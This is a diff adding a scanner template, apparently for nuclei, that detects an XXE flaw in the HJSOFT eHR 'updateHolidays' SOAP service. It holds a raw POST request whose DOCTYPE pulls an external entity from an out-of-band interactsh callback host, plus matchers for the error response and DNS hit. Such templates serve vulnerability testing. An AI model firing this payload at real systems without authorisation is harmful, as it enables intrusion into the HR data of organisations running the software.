@@ -1,0 +1,43 @@
+id: poc-yaml-hjsoft-ehr-updateholidays-xxe
+info:
+  name: HJSOFT eHR updateHolidays XXE Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: DNSLOG,XXE
+http:
+  - raw:
+      - |
+        POST /services/HrpService HTTP/1.1
+        Host: {{Hostname}}
+        SOAPAction: ""
+        Content-Type: text/xml;charset=UTF-8
+
+        <!DOCTYPE syscode SYSTEM "http://{{interactsh-url}}/updateHolidays">
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:hrp="http://www.hjsj.com/HrpService">
+          <soapenv:Header/>
+          <soapenv:Body>
+            <hrp:updateHolidays>
+              <hrp:in0>ORs1P9DMem9byoEeSArcK+T60iqKxo6h2M7ONzAhR7w=</hrp:in0>
+              <hrp:in1>cni23</hrp:in1>
+              <hrp:in2><syscode>&send;</syscode></hrp:in2>
+            </hrp:updateHolidays>
+          </soapenv:Body>
+        </soapenv:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "java.io.IOException"
+          - "updateHolidays"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
